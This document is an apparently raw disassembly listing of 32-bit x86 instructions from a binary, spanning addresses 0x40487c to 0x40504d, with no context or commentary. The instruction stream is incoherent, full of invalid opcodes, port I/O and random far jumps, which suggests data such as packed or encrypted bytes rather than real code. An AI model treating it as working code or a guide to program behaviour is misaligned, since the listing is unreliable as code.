  40487c:	retf   0x5885
  40487f:	sub    BYTE PTR [edi+edx*1],dl
  404882:	arpl   WORD PTR [esi],dx
  404884:	ins    BYTE PTR es:[edi],dx
  404885:	cmp    BYTE PTR [eax+ecx*4],0x7e
  404889:	mov    edi,ecx
  40488b:	add    esi,DWORD PTR [ebx-0x3e732863]
  404891:	cmp    al,0x90
  404893:	(bad)  [edi]
  404895:	stos   BYTE PTR es:[edi],al
  404896:	xchg   bh,ch
  404898:	test   esp,edx
  40489a:	sar    edx,cl
  40489c:	rol    DWORD PTR [esi-0x4f],0x8f
  4048a0:	sahf   
  4048a1:	rcr    BYTE PTR [ecx+0x4a],0x39
  4048a5:	(bad)  
  4048a6:	in     eax,dx
  4048a7:	add    dh,BYTE PTR [eax]
  4048a9:	jge    0x404902
  4048ab:	int    0xde
  4048ad:	int3   
  4048ae:	or     BYTE PTR [eiz*2+0x6cdbca2b],bh
  4048b5:	add    bl,0x4
  4048b8:	stos   BYTE PTR es:[edi],al
  4048b9:	add    al,0xc1
  4048bb:	stos   BYTE PTR es:[edi],al
  4048bc:	mov    ds:0x35d8deaa,al
  4048c1:	fimul  DWORD PTR [ecx]
  4048c3:	fcomp  DWORD PTR [edi+0x30e6e221]
  4048c9:	(bad)  
  4048ca:	jg     0x40484f
  4048cc:	jge    0x404889
  4048ce:	mov    eax,0x6ba3c401
  4048d3:	pushf  
  4048d4:	and    BYTE PTR [edx],0xd9
  4048d7:	jo     0x404924
  4048d9:	inc    ebx
  4048da:	aas    
  4048db:	xchg   ebp,eax
  4048dc:	inc    ebp
  4048dd:	ret    0x8d7a
  4048e0:	mov    DWORD PTR [eax+ebp*8+0xd],esi
  4048e4:	inc    esi
  4048e5:	popf   
  4048e6:	stos   BYTE PTR es:[edi],al
  4048e7:	adc    eax,0x68130f21
  4048ec:	mov    edx,0xb5796df3
  4048f1:	idiv   BYTE PTR [edx]
  4048f3:	mov    esi,0x2936bc39
  4048f8:	mov    esp,0x52ec0958
  4048fd:	popf   
  4048fe:	jge    0x404940
  404900:	mov    ecx,0x1c0a32fc
  404905:	jl     0x40491e
  404907:	cs clc 
  404909:	mov    dl,0xf2
  40490b:	repz (bad) 
  40490e:	inc    ecx
  40490f:	out    0x8e,eax
  404911:	push   ecx
  404912:	data16 aam 0x69
  404915:	iret   
  404916:	sti    
  404917:	gs repnz cmp esp,eax
  40491b:	(bad)  [eax+eiz*1+0x74ef289f]
  404922:	loope  0x40494e
  404924:	push   ecx
  404925:	add    bh,ch
  404927:	dec    esi
  404928:	push   ecx
  404929:	jo     0x4048d5
  40492b:	ret    0xe8d0
  40492e:	fsub   st,st(6)
  404930:	dec    ebx
  404931:	aad    0x88
  404933:	test   DWORD PTR [edi+0x4e],edi
  404936:	je     0x4048e3
  404938:	rol    BYTE PTR [ebp+0x5b4b9814],0xe2
  40493f:	jg     0x4049b7
  404941:	test   al,0x82
  404943:	inc    edx
  404944:	dec    eax
  404945:	push   cs
  404946:	cli    
  404947:	ins    BYTE PTR es:[edi],dx
  404948:	in     eax,0x8e
  40494a:	inc    ecx
  40494b:	inc    ebx
  40494c:	xor    DWORD PTR [eax+ebx*8+0x2a],ebp
  404950:	xor    edi,DWORD PTR [esi]
  404952:	rcr    BYTE PTR [esi-0x32],cl
  404955:	adc    edi,esp
  404957:	in     al,dx
  404958:	nop
  404959:	(bad)  
  40495a:	rol    cl,0xf1
  40495d:	scas   eax,DWORD PTR es:[edi]
  40495e:	retf   
  40495f:	mov    edx,0xeddbddcd
  404964:	xor    al,0xe9
  404966:	mov    esi,0x580ddcb5
  40496b:	pop    eax
  40496c:	add    cl,bh
  40496e:	and    al,0x2d
  404970:	push   esp
  404971:	mov    edx,0xcd962e57
  404976:	inc    edi
  404977:	sub    eax,0xf80dc97b
  40497c:	cmp    esp,0xa53c0c31
  404982:	add    eax,0xa00077cd
  404987:	mov    edx,0x7e0b7ff6
  40498c:	push   cs
  40498d:	and    DWORD PTR [eax-0x71dfc4c5],0xffffff86
  404994:	imul   edx,DWORD PTR [ecx+edi*1-0x6d],0xfffffff7
  404999:	xchg   DWORD PTR [edx+edx*4-0x21],ebx
  40499d:	retf   0x27dd
  4049a0:	mov    ds:0xa7894048,eax
  4049a5:	inc    edi
  4049a6:	je     0x404a13
  4049a8:	mov    edi,0x59774f9f
  4049ad:	fmul   DWORD PTR [edi]
  4049af:	mov    eax,0x2bae2b6a
  4049b4:	and    al,BYTE PTR [esi]
  4049b6:	in     al,dx
  4049b7:	mov    ebp,0xfa4c65f1
  4049bc:	push   ds
  4049bd:	pop    es
  4049be:	or     eax,0x943c384f
  4049c3:	sbb    al,0xc8
  4049c5:	adc    edx,ebx
  4049c7:	mov    bh,0x1c
  4049c9:	pop    esi
  4049ca:	jmp    0x93b1:0xe45b04ce
  4049d1:	mov    eax,0xcb6c3e2c
  4049d6:	push   esi
  4049d7:	push   ds
  4049d8:	shl    DWORD PTR [edi-0x4d],0xef
  4049dc:	aaa    
  4049dd:	outs   dx,BYTE PTR ds:[esi]
  4049de:	pop    edx
  4049df:	inc    eax
  4049e0:	mov    eax,ds:0xc8a32d65
  4049e5:	pusha  
  4049e6:	leave  
  4049e7:	jp     0x404a20
  4049e9:	push   edx
  4049ea:	adc    BYTE PTR ds:0x6a66dbb6,dl
  4049f0:	jmp    0x9862aa4a
  4049f5:	xor    eax,0x7559ebfe
  4049fa:	xor    eax,0x16e13f07
  4049ff:	lds    ecx,FWORD PTR [edx]
  404a01:	test   DWORD PTR [esi+0x6a],ebp
  404a04:	xchg   edi,eax
  404a05:	sahf   
  404a06:	iret   
  404a07:	(bad)  
  404a08:	mov    eax,0xe348073
  404a0d:	jl     0x404a5e
  404a0f:	dec    eax
  404a10:	dec    BYTE PTR [edi+0x60]
  404a13:	add    DWORD PTR [edi+0x2b],0x62
  404a17:	pushf  
  404a18:	shrd   DWORD PTR [ebx+0x6678ad92],esi,cl
  404a1f:	inc    edx
  404a20:	xchg   BYTE PTR [eax],cl
  404a22:	xor    al,0xf
  404a24:	xchg   esp,eax
  404a25:	dec    esi
  404a27:	or     ebp,DWORD PTR [ebp-0x20acebc7]
  404a2d:	push   ecx
  404a2e:	push   esi
  404a2f:	jge    0x4049d1
  404a31:	outs   dx,BYTE PTR ds:[esi]
  404a32:	cmp    ebx,DWORD PTR [edi+0x320ca6dc]
  404a38:	pop    edi
  404a39:	mov    ?,ebx
  404a3b:	pop    ebp
  404a3c:	lods   al,BYTE PTR ds:[esi]
  404a3d:	repz push ebx
  404a3f:	out    0x24,al
  404a41:	dec    eax
  404a42:	and    ah,BYTE PTR [edx-0x2bebc99]
  404a48:	xor    ch,BYTE PTR [edx+edx*1-0x4cd77c5c]
  404a4f:	mov    ah,0x74
  404a51:	fs fsqrt 
  404a54:	inc    ecx
  404a55:	cmp    esp,DWORD PTR ds:0x4e06b8cf
  404a5b:	sbb    al,0x5d
  404a5d:	add    dh,BYTE PTR [edx]
  404a5f:	enter  0xe699,0xcc
  404a63:	into   
  404a64:	fisttp WORD PTR [edi+0x1703364a]
  404a6a:	outs   dx,BYTE PTR ds:[esi]
  404a6b:	fsubp  st(3),st
  404a6d:	and    DWORD PTR [edx],0xffffffa0
  404a70:	or     DWORD PTR [eax+0x2465a11],esi
  404a76:	sub    al,0xbf
  404a78:	call   0x36a2:0x8614b8b1
  404a7f:	pop    esi
  404a80:	call   0x830d:0xc296148a
  404a87:	out    dx,al
  404a88:	sub    bl,BYTE PTR [ecx-0x3a7ad765]
  404a8e:	std    
  404a8f:	loopne 0x404a52
  404a91:	sbb    esi,DWORD PTR [ebx]
  404a93:	push   DWORD PTR [eax+0x12]
  404a96:	out    dx,al
  404a97:	scas   eax,DWORD PTR es:[edi]
  404a98:	popw   es
  404a9a:	jp     0x404a56
  404a9c:	cmp    BYTE PTR [eax+esi*2],0x3
  404aa0:	out    dx,al
  404aa1:	fstp   QWORD PTR [edi]
  404aa3:	in     eax,dx
  404aa4:	cmp    DWORD PTR [eax-0x42],ebx
  404aa7:	inc    ecx
  404aa8:	dec    edx
  404aa9:	xchg   esi,eax
  404aaa:	int3   
  404aab:	call   0xbac8:0x5651134c
  404ab2:	imul   DWORD PTR [ecx+0x78]
  404ab5:	sub    eax,0xd668b311
  404aba:	mov    esp,0xa9d46046
  404abf:	mov    al,0x15
  404ac1:	pop    es
  404ac2:	dec    edx
  404ac3:	out    dx,eax
  404ac4:	inc    ecx
  404ac5:	cdq    
  404ac6:	ret    0x7d8c
  404ac9:	add    DWORD PTR ds:0xe8465c6,edx
  404acf:	shr    DWORD PTR [esi],0x46
  404ad2:	mov    bh,BYTE PTR [ebx+0x4699ff66]
  404ad8:	and    esi,DWORD PTR [eax-0x7e]
  404adb:	jecxz  0x404af6
  404add:	or     edi,DWORD PTR [ecx+0x6b]
  404ae0:	jecxz  0x404aa8
  404ae2:	pop    esp
  404ae3:	loop   0x404ac2
  404ae5:	push   cs
  404ae6:	cmp    bh,al
  404ae8:	jmp    0x156a:0x6df75d0b
  404aef:	std    
  404af0:	popf   
  404af1:	call   0x1be3:0x6e76e607
  404af8:	test   al,0xdc
  404afa:	mov    al,0xda
  404afc:	cwde   
  404afd:	sbb    ch,dl
  404aff:	add    al,BYTE PTR [ecx+0x76]
  404b02:	aad    0x98
  404b04:	and    dh,bh
  404b06:	(bad)  
  404b07:	fld    DWORD PTR [eax+0x12747d62]
  404b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b0e:	jg     0x404b25
  404b10:	test   BYTE PTR [esi+0x3e67c832],ah
  404b16:	mov    dh,0x15
  404b18:	cli    
  404b19:	ret    
  404b1a:	test   BYTE PTR [edx-0x1c],dh
  404b1d:	inc    esp
  404b1e:	into   
  404b1f:	dec    edi
  404b20:	test   dl,ah
  404b22:	or     eax,0x79331ca5
  404b27:	sub    DWORD PTR [edx+0x238d2285],edx
  404b2d:	mov    ds:0xefc15450,al
  404b32:	mov    BYTE PTR [esi],ch
  404b34:	and    al,0x34
  404b36:	adc    eax,0x46ea717d
  404b3b:	jmp    FWORD PTR [ebp+0x5c845d95]
  404b41:	fs adc al,0x77
  404b44:	int3   
  404b45:	call   ebp
  404b47:	mov    ch,0xad
  404b49:	mov    ebx,0xdf8b738b
  404b4e:	aaa    
  404b4f:	sub    ebx,esp
  404b51:	pop    edx
  404b52:	out    dx,al
  404b53:	mov    esi,ds
  404b55:	leave  
  404b56:	lods   eax,DWORD PTR ds:[esi]
  404b57:	mov    ds:0x4deade19,al
  404b5c:	retf   0x8191
  404b5f:	and    ah,dl
  404b61:	fisubr DWORD PTR [esi-0x47]
  404b64:	aad    0x75
  404b66:	jae    0x404b38
  404b68:	fild   DWORD PTR gs:[eax+0x72]
  404b6c:	xchg   ecx,ebp
  404b6e:	dec    edi
  404b6f:	(bad)  
  404b70:	rol    edi,0x33
  404b73:	inc    edx
  404b74:	dec    esi
  404b75:	push   edi
  404b76:	inc    ecx
  404b77:	jae    0x404b52
  404b79:	xor    al,dh
  404b7b:	dec    edx
  404b7c:	lds    edi,FWORD PTR [ebp-0x626d8ebd]
  404b82:	shl    BYTE PTR [edi+edx*1],0xc9
  404b86:	sahf   
  404b87:	jne    0x404b30
  404b89:	jns    0x404b26
  404b8b:	sub    ebp,DWORD PTR [ecx-0x598dbbe3]
  404b91:	xor    DWORD PTR [ecx+0x6ac5db1d],ebp
  404b97:	push   0x3d
  404b99:	fiadd  DWORD PTR [esi-0x9a5b3d0]
  404b9f:	push   edi
  404ba0:	iret   
  404ba1:	sbb    al,0x42
  404ba3:	cmp    edi,0xffffffcc
  404ba6:	xor    cl,BYTE PTR [esi]
  404ba8:	xor    bl,BYTE PTR [edx]
  404baa:	enter  0x6f5e,0xdb
  404bae:	jnp    0x404c10
  404bb0:	push   ebx
  404bb1:	outs   dx,DWORD PTR ds:[esi]
  404bb2:	jge    0x404bf4
  404bb4:	outs   dx,DWORD PTR cs:[esi]
  404bb6:	mov    bh,0x43
  404bb8:	push   es
  404bb9:	pop    edi
  404bba:	daa    
  404bbb:	aad    0x7a
  404bbd:	sbb    dh,BYTE PTR [ecx+0x3486c39e]
  404bc3:	sbb    al,0xad
  404bc5:	xchg   esi,eax
  404bc6:	xor    eax,0xbd999ca1
  404bcb:	call   0x78472983
  404bd0:	push   edx
  404bd1:	inc    edx
  404bd2:	arpl   WORD PTR [ebx-0x65],si
  404bd5:	sbb    dl,BYTE PTR [edi+0x13]
  404bd8:	outs   dx,DWORD PTR ds:[esi]
  404bd9:	shr    BYTE PTR [esi+0x3bcf6e6f],1
  404bdf:	lahf   
  404be0:	mov    ch,0xe7
  404be2:	mov    ds:0x5ff8b12,al
  404be7:	inc    edi
  404be8:	dec    eax
  404be9:	cli    
  404bea:	hlt    
  404beb:	inc    esi
  404bec:	test   DWORD PTR [edi+ebp*8],ebp
  404bef:	xchg   esi,eax
  404bf0:	femms  
  404bf2:	fcmovb st,st(3)
  404bf4:	test   eax,0x46a29350
  404bf9:	add    al,BYTE PTR [edx-0x7cbf1a13]
  404bff:	fisttp WORD PTR ds:0x3c3667df
  404c05:	pop    ds
  404c06:	imul   ebx,ecx,0xb04f5776
  404c0c:	addr16 pop ss
  404c0e:	adc    BYTE PTR [eax],ah
  404c10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c11:	and    al,ah
  404c13:	inc    esp
  404c14:	enterw 0xd464,0x90
  404c19:	outs   dx,DWORD PTR ds:[esi]
  404c1a:	fldenv [esi]
  404c1c:	int    0xfa
  404c1e:	in     al,dx
  404c1f:	sbb    al,0x17
  404c21:	(bad)  
  404c22:	lock das 
  404c24:	pop    esp
  404c25:	call   0xc0bd:0xfdade240
  404c2c:	fistp  QWORD PTR [edx+0x32]
  404c2f:	ret    
  404c30:	mov    dh,0xb5
  404c32:	inc    ecx
  404c33:	ins    DWORD PTR es:[edi],dx
  404c34:	jno    0x404c81
  404c36:	jo     0x404ca8
  404c38:	jns    0x404bc8
  404c3a:	xchg   esi,eax
  404c3b:	ja     0x404c62
  404c3d:	mov    cl,0x4e
  404c3f:	adc    eax,0xd84c2b1c
  404c44:	and    bl,ch
  404c46:	and    BYTE PTR [esi+0x28],ah
  404c49:	lods   al,BYTE PTR ds:[esi]
  404c4a:	xor    cl,cl
  404c4c:	pop    esi
  404c4d:	imul   edx,DWORD PTR [edx-0x66c30554],0xffffffc4
  404c54:	repnz clc 
  404c56:	push   esi
  404c57:	push   ebp
  404c58:	xor    eax,0xc2d685b
  404c5d:	mov    eax,gs
  404c5f:	(bad)  
  404c60:	mov    dh,0x36
  404c62:	sub    BYTE PTR [eax-0x1fc2345c],ch
  404c68:	xor    BYTE PTR [esp+eiz*8+0x3a3f2bb5],ah
  404c6f:	scas   al,BYTE PTR es:[edi]
  404c70:	out    dx,eax
  404c71:	pusha  
  404c72:	cmp    bp,WORD PTR [esi+0x1ff3d7c5]
  404c79:	jmp    0x404cdb
  404c7b:	cmp    eax,0x29985e38
  404c80:	addr16 ds popa 
  404c83:	packuswb mm4,QWORD PTR [eax+edx*1]
  404c87:	pop    eax
  404c88:	icebp  
  404c89:	push   ebp
  404c8a:	retf   0xc4de
  404c8d:	fdiv   DWORD PTR [ecx-0x746ffec3]
  404c93:	sbb    esp,DWORD PTR [edx+esi*1-0xf]
  404c97:	daa    
  404c98:	pop    edi
  404c99:	int3   
  404c9a:	or     bh,ah
  404c9c:	stc    
  404c9d:	xlat   BYTE PTR ss:[ebx]
  404c9f:	and    BYTE PTR [esi+edx*2],cl
  404ca2:	push   ecx
  404ca3:	mov    DWORD PTR [edx-0x3ff7d97d],edx
  404ca9:	lods   eax,DWORD PTR ds:[esi]
  404caa:	add    DWORD PTR [eax+0x2633c036],eax
  404cb0:	mov    dh,0xae
  404cb2:	dec    eax
  404cb3:	ins    BYTE PTR es:[edi],dx
  404cb4:	std    
  404cb5:	and    esi,ebp
  404cb7:	dec    eax
  404cb8:	or     eax,0x3787e48
  404cbd:	inc    esi
  404cbe:	push   ebx
  404cbf:	xchg   ebp,eax
  404cc0:	les    esi,FWORD PTR [edx]
  404cc2:	xchg   ecx,eax
  404cc3:	or     DWORD PTR [edx-0x7008fa29],edx
  404cc9:	mov    WORD PTR [ebx],?
  404ccb:	outs   dx,BYTE PTR ds:[esi]
  404ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ccd:	cmp    DWORD PTR ds:0xed4b6b6e,ecx
  404cd3:	(bad)  
  404cd4:	cli    
  404cd5:	popa   
  404cd6:	sbb    eax,0xb73a0475
  404cdb:	jmp    FWORD PTR [ebp+ebp*2+0x25]
  404cdf:	daa    
  404ce0:	imul   eax,DWORD PTR [esp+ebx*2-0x239f03ac],0xffffff86
  404ce8:	daa    
  404ce9:	dec    edi
  404cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ceb:	jmp    0x2a524456
  404cf0:	imul   ecx,DWORD PTR [ebp+0x13a854d],0x9f776cae
  404cfa:	leave  
  404cfb:	jns    0x404c7d
  404cfd:	or     BYTE PTR [ebp-0x2f],dh
  404d00:	jg     0x404d1c
  404d02:	pop    es
  404d03:	in     al,dx
  404d04:	push   cs
  404d05:	mov    DWORD PTR [edi+eiz*8],0x1caa19bf
  404d0c:	fcmove st,st(3)
  404d0e:	sub    BYTE PTR [edi],0x1a
  404d11:	xor    eax,0x8c4d7604
  404d16:	dec    eax
  404d17:	fistp  QWORD PTR [ebx-0x74]
  404d1a:	hlt    
  404d1b:	jae    0x404d21
  404d1d:	mov    ds:0xd9fa5c3f,eax
  404d22:	aaa    
  404d23:	leave  
  404d24:	inc    esp
  404d25:	mov    edi,DWORD PTR [ebp*8+0x47c9872e]
  404d2c:	test   eax,0xf0b2b084
  404d31:	(bad)  
  404d32:	es and al,0xbd
  404d35:	adc    ebx,ebx
  404d37:	(bad)  
  404d38:	xchg   edx,eax
  404d39:	xchg   BYTE PTR [eax+ebp*8+0x108fa0fb],dh
  404d40:	es stos DWORD PTR es:[edi],eax
  404d42:	push   ss
  404d43:	in     al,0xbc
  404d45:	adc    al,0x8d
  404d47:	mov    bl,0x6c
  404d49:	test   eax,0x2c6b22c9
  404d4e:	or     al,0x24
  404d50:	nop
  404d51:	xchg   ebp,eax
  404d52:	cli    
  404d53:	mov    al,ds:0x274191cf
  404d58:	test   DWORD PTR [edx-0x72],esi
  404d5b:	pop    esp
  404d5c:	ins    BYTE PTR es:[edi],dx
  404d5d:	xlat   BYTE PTR ds:[ebx]
  404d5e:	pop    edx
  404d5f:	mov    ds:0x7a82773d,al
  404d64:	out    dx,al
  404d65:	jno    0x404d84
  404d67:	and    al,0xd6
  404d69:	mul    DWORD PTR [ecx-0x32665d91]
  404d6f:	jnp    0x404d1d
  404d71:	fwait
  404d72:	dec    ebx
  404d73:	inc    esp
  404d74:	aaa    
  404d75:	mov    ah,0xf9
  404d77:	mov    esp,0x855a7605
  404d7c:	and    al,0x55
  404d7e:	xchg   dl,bl
  404d80:	mov    bl,ch
  404d82:	inc    esi
  404d83:	out    0x68,al
  404d85:	inc    edx
  404d86:	or     BYTE PTR [ebp+0x56979a23],al
  404d8c:	pop    ebp
  404d8d:	mov    bl,0x6f
  404d8f:	xchg   esp,eax
  404d90:	adc    ebx,DWORD PTR [edi]
  404d92:	ror    DWORD PTR [esi],cl
  404d94:	jmp    0x404d69
  404d96:	sbb    al,0x88
  404d98:	xor    al,0x1e
  404d9a:	jae    0x404e14
  404d9c:	cmovno ecx,DWORD PTR [eax+esi*1+0x6fcf1bac]
  404da4:	lock int3 
  404da6:	out    0xd,eax
  404da8:	pop    ecx
  404da9:	mov    ebx,0xdc46a49e
  404dae:	pop    ds
  404daf:	mov    ebp,0x5e0ad713
  404db4:	inc    ebp
  404db5:	push   edi
  404db6:	cli    
  404db7:	or     eax,0x8558fc58
  404dbc:	mov    bh,0x88
  404dbe:	repz iret 
  404dc0:	sbb    al,0x9a
  404dc2:	ret    0x1886
  404dc5:	mov    esi,0xb9ca7dfd
  404dca:	cli    
  404dcb:	dec    edi
  404dcc:	inc    ebx
  404dcd:	into   
  404dce:	imul   esp,ebx,0x74
  404dd1:	xchg   esp,eax
  404dd2:	daa    
  404dd3:	mov    al,ch
  404dd5:	ss push es
  404dd7:	inc    esi
  404dd8:	inc    edi
  404dd9:	mov    eax,0xcfcbe26b
  404dde:	xor    esp,DWORD PTR [edi]
  404de0:	imul   edx,ebp,0xe99e2db3
  404de6:	enter  0x7449,0xd2
  404dea:	(bad)  
  404deb:	lods   al,BYTE PTR ds:[esi]
  404dec:	ja     0x404e4c
  404dee:	add    eax,0x1594e3ea
  404df3:	xchg   DWORD PTR [ebx-0x265e9da8],ebx
  404df9:	jmp    0x404dc1
  404dfb:	mov    ch,0xc6
  404dfd:	fwait
  404dfe:	xor    al,0x56
  404e00:	jno    0x404e4f
  404e02:	gs mov esp,0x2dc82a3b
  404e08:	push   ebx
  404e09:	pop    ebx
  404e0a:	mov    edx,0x590ad36d
  404e0f:	mov    edi,0xd3c7cc56
  404e14:	in     eax,dx
  404e15:	mov    ebp,0x897f1e46
  404e1a:	ds call 0x875d:0x214aa84e
  404e22:	dec    ebx
  404e23:	rol    BYTE PTR [edx-0x7da86da7],0xd8
  404e2a:	aad    0xc5
  404e2c:	sar    DWORD PTR [ebx-0x2e0ac803],1
  404e32:	push   edi
  404e33:	sbb    eax,0xb3b2da85
  404e38:	push   es
  404e39:	es in  al,0x4a
  404e3c:	fs inc edx
  404e3e:	(bad)  
  404e40:	sbb    eax,0x9b1089cf
  404e45:	out    dx,eax
  404e46:	pop    esp
  404e47:	call   0xad20bc8e
  404e4c:	(bad)  
  404e4e:	out    dx,al
  404e4f:	shl    BYTE PTR [edx-0x15],0x35
  404e53:	repz and ebx,DWORD PTR [ecx+0x6c0b304e]
  404e5a:	mov    bh,0xa0
  404e5c:	inc    ecx
  404e5d:	jp     0x404e2d
  404e5f:	aam    0x78
  404e61:	xor    BYTE PTR [ecx+0x28],bl
  404e64:	sar    BYTE PTR [edx],1
  404e66:	out    dx,eax
  404e67:	sbb    DWORD PTR [esi],0x1c
  404e6a:	ds jmp 0x404e8a
  404e6d:	adc    ebp,ebp
  404e6f:	dec    esi
  404e70:	retf   0x5dc2
  404e73:	and    al,0x4c
  404e75:	push   0xbe57559d
  404e7a:	je     0x404e48
  404e7c:	xor    al,0x1b
  404e7e:	sbb    BYTE PTR [esi+0x4a84ee22],bl
  404e84:	fwait
  404e85:	ins    BYTE PTR es:[edi],dx
  404e86:	out    dx,eax
  404e87:	cmp    DWORD PTR [eax-0x3],esi
  404e8a:	nop
  404e8b:	cmc    
  404e8c:	repz adc DWORD PTR [eax+0x60e88313],0x2fb9c5a2
  404e97:	push   esi
  404e98:	inc    ebp
  404e99:	pop    ebp
  404e9a:	mov    esp,0x53c2ed12
  404e9f:	xlat   BYTE PTR ds:[ebx]
  404ea0:	pusha  
  404ea1:	jns    0x404eb4
  404ea3:	dec    eax
  404ea4:	push   ebx
  404ea5:	cmp    ch,BYTE PTR [ebp-0x3b8a64a2]
  404eab:	inc    DWORD PTR [esi+0x5edae16a]
  404eb1:	ror    dl,1
  404eb3:	mov    ds:0xb296ade4,eax
  404eb8:	addr16 fs push esi
  404ebb:	leave  
  404ebc:	push   eax
  404ebd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ebe:	pop    eax
  404ebf:	sub    al,0x7a
  404ec1:	push   ebx
  404ec2:	fst    st(4)
  404ec4:	es jbe 0x404f32
  404ec7:	jb     0x404edb
  404ec9:	arpl   ax,bx
  404ecb:	daa    
  404ecc:	scas   al,BYTE PTR es:[edi]
  404ecd:	out    0x7e,eax
  404ecf:	fimul  WORD PTR [esp+ecx*2+0x5a31738e]
  404ed6:	in     al,dx
  404ed7:	aam    0x4b
  404ed9:	pop    edx
  404eda:	call   0x87a4:0x44ff6d7b
  404ee1:	mov    esi,0x80421773
  404ee6:	jg     0x404ea0
  404ee8:	add    esp,esi
  404eea:	imul   ebx,DWORD PTR [ebp-0x3000faaa],0x67
  404ef1:	xchg   ecx,eax
  404ef2:	scas   al,BYTE PTR es:[edi]
  404ef3:	sti    
  404ef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ef5:	or     esp,DWORD PTR [esi-0x4b2e7215]
  404efb:	(bad)  
  404efc:	and    dl,BYTE PTR [eax-0x79]
  404eff:	jl     0x404ec7
  404f01:	dec    ebp
  404f02:	pop    ebx
  404f03:	data16 (bad) 
  404f05:	shl    BYTE PTR ss:[esi],1
  404f08:	jae    0x404ec4
  404f0a:	(bad)  
  404f0c:	shl    BYTE PTR [edi],cl
  404f0e:	lds    ecx,FWORD PTR [eax+0x28a64650]
  404f14:	arpl   WORD PTR [ebp-0x6],ax
  404f17:	push   eax
  404f18:	sbb    DWORD PTR [ecx],edx
  404f1a:	ss clc 
  404f1c:	jne    0x404f45
  404f1e:	(bad)  
  404f1f:	dec    eax
  404f20:	stos   DWORD PTR es:[edi],eax
  404f21:	call   0xf8036b6e
  404f26:	ds scas eax,DWORD PTR es:[edi]
  404f28:	mov    edi,0xfc5c881d
  404f2d:	mov    dl,0x56
  404f2f:	push   ds
  404f30:	fwait
  404f31:	jne    0x404eea
  404f33:	iret   
  404f34:	or     al,0x81
  404f36:	lock (bad) 
  404f38:	push   0x73
  404f3a:	add    esi,DWORD PTR [eax]
  404f3c:	or     ecx,DWORD PTR [esp+edx*8]
  404f3f:	(bad)  
  404f40:	pop    ebx
  404f41:	sbb    al,0x3e
  404f43:	jno    0x404f5e
  404f45:	cmp    bl,dl
  404f47:	xchg   DWORD PTR [edx],edx
  404f49:	fidiv  WORD PTR [eax+0x1b]
  404f4c:	sahf   
  404f4d:	ins    BYTE PTR es:[edi],dx
  404f4e:	inc    ebp
  404f4f:	jecxz  0x404f1d
  404f51:	pop    ebp
  404f52:	xchg   edx,eax
  404f53:	add    bh,BYTE PTR [esi-0x383ddb17]
  404f59:	pop    es
  404f5a:	mov    ebp,0x25142b54
  404f5f:	mov    BYTE PTR [esi],dh
  404f61:	jge    0x404f1b
  404f63:	xchg   ecx,eax
  404f64:	or     DWORD PTR [ecx-0x66],eax
  404f67:	and    ebp,DWORD PTR [edi+0x70]
  404f6a:	adc    al,BYTE PTR [ecx+0x44cfda26]
  404f70:	mov    ecx,0x7cb4d5f6
  404f75:	pop    ebp
  404f76:	fs inc esp
  404f78:	pop    esp
  404f79:	add    BYTE PTR [ebx-0x4b088caa],0xab
  404f80:	dec    esp
  404f81:	mov    cl,0x6f
  404f83:	sar    BYTE PTR [edi-0x30],1
  404f86:	and    DWORD PTR [edx],ecx
  404f88:	scas   eax,DWORD PTR es:[edi]
  404f89:	loope  0x404fae
  404f8b:	mov    cl,0x77
  404f8d:	rol    DWORD PTR [edi],1
  404f8f:	mov    bl,0xcb
  404f91:	add    bl,dh
  404f93:	movups xmm1,xmm0
  404f96:	cmp    ebp,edi
  404f98:	in     eax,0x4c
  404f9a:	test   al,0x6c
  404f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f9d:	fcmovb st,st(1)
  404f9f:	retf   0xae83
  404fa2:	adc    al,0x83
  404fa4:	ret    0xb909
  404fa7:	ins    BYTE PTR es:[edi],dx
  404fa8:	mov    cl,0x62
  404faa:	fwait
  404fab:	repz mov ch,0x1
  404fae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404faf:	ffreep st(5)
  404fb1:	leave  
  404fb2:	jae    0x405027
  404fb4:	sbb    BYTE PTR [ecx],ch
  404fb6:	call   0xabf4afd7
  404fbb:	jmp    0xb6d3:0x5f59aed9
  404fc2:	js     0x404ffe
  404fc4:	or     eax,0xae4a6749
  404fc9:	out    0x9,eax
  404fcb:	pop    esp
  404fcc:	ins    DWORD PTR es:[edi],dx
  404fcd:	test   bh,dh
  404fcf:	sbb    ch,bl
  404fd1:	sub    al,0xc8
  404fd3:	mov    ?,WORD PTR [ebp-0x3f72b48d]
  404fd9:	pop    ebx
  404fda:	hlt    
  404fdb:	sub    BYTE PTR [ecx],al
  404fdd:	(bad)  
  404fde:	ror    DWORD PTR [edx-0x4e],cl
  404fe1:	cmp    al,0xe9
  404fe3:	jo     0x404f7f
  404fe5:	or     eax,DWORD PTR [edi]
  404fe7:	jne    0x404f6a
  404fe9:	mov    ebp,0x514a2050
  404fee:	add    al,0x63
  404ff0:	jp     0x405058
  404ff2:	cli    
  404ff3:	shr    cl,cl
  404ff5:	add    ah,al
  404ff7:	pop    esp
  404ff8:	fstp   DWORD PTR [eax]
  404ffa:	push   ss
  404ffb:	cld    
  404ffc:	pop    ecx
  404ffd:	pop    ebp
  404ffe:	push   ss
  404fff:	mov    edi,0xace01499
  405004:	pop    edx
  405005:	jl     0x405053
  405007:	aas    
  405008:	enter  0xb857,0x71
  40500c:	mov    al,0x1e
  40500e:	dec    eax
  40500f:	sub    eax,0x818fb948
  405014:	add    ebp,ebp
  405016:	xor    ebp,eax
  405018:	mov    ds:0x5c4d418,al
  40501d:	ret    0xd469
  405020:	sub    ah,dh
  405022:	pop    edx
  405023:	gs push edi
  405025:	and    edx,DWORD PTR [ecx-0x4561924d]
  40502b:	lea    edi,[ebp-0x3faf58d3]
  405031:	(bad)  
  405032:	rsqrtps xmm7,xmm1
  405035:	xchg   al,ah
  405037:	add    DWORD PTR [esi],eax
  405039:	cmp    ecx,DWORD PTR [esi-0x6693dc07]
  40503f:	dec    esp
  405040:	add    DWORD PTR [edx+0x4],ecx
  405043:	(bad)  
  405044:	in     al,0x24
  405046:	in     al,dx
  405047:	pop    ds
  405048:	popf   
  405049:	inc    ebx
  40504a:	iret   
  40504b:	in     al,0xb7
  40504d:	pusha  
